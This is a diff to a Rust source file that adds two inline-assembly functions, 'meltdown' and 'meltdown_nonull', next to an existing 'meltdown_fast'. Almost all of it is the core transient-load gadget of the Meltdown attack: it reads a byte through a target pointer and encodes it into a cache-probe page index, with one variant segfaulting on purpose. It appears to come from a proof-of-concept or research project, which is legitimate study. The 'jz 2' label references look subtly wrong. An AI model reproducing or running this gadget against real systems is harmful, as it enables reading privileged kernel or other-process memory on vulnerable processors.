@@ -33,6 +33,40 @@ pub struct Config {
 	retries: u32,
 }
 
+pub fn meltdown(mem: &[MemoryPage], pointer: *const u8) {
+    unsafe {
+        asm!(
+            "2:", // jump here to restart if shift result was 0
+            "mov {tmp3}, [{tmp3}]", // this uses rsi in original, which is 0 and segfaults
+            "movzx {tmp}, BYTE PTR [{x}]", // BYTE PTR is required to speciy that we only want to load one byte from that address. movzx requires the operand size to be specified, to know how much needs to be filled with 0. The resulting instruction will be "movzbq"
+            "shl {tmp}, 12", // Multiply by 4096, as we want to address one entire page based on the loaded value
+            "jz 2", // restart if shift result was 0
+            "mov {tmp2}, [{base}+{tmp}]", // Access the page with the index of the loaded value, TODO check in gdb if this is compiled to movq as in the original
+            x = in(reg) pointer,
+            base = in(reg) &mem[0] as *const MemoryPage,
+            tmp = out(reg) _,
+            tmp2 = out(reg) _,
+            tmp3 = out(reg) _,
+        );
+    }
+}
+
+pub fn meltdown_nonull(mem: &[MemoryPage], pointer: *const u8) {
+    unsafe {
+        asm!(
+            "2:", // jump here to restart if shift result was 0
+            "movzx {tmp}, BYTE PTR [{x}]", // BYTE PTR is required to speciy that we only want to load one byte from that address. movzx requires the operand size to be specified, to know how much needs to be filled with 0. The resulting instruction will be "movzbq"
+            "shl {tmp}, 12", // Multiply by 4096, as we want to address one entire page based on the loaded value
+            "jz 2", // restart if shift result was 0
+            "mov {tmp2}, [{base}+{tmp}]", // Access the page with the index of the loaded value, TODO check in gdb if this is compiled to movq as in the original
+            x = in(reg) pointer,
+            base = in(reg) &mem[0] as *const MemoryPage,
+            tmp = out(reg) _,
+            tmp2 = out(reg) _,
+        );
+    }
+}
+
 pub fn meltdown_fast(mem: &[MemoryPage], pointer: *const u8) {
     unsafe {
         asm!(
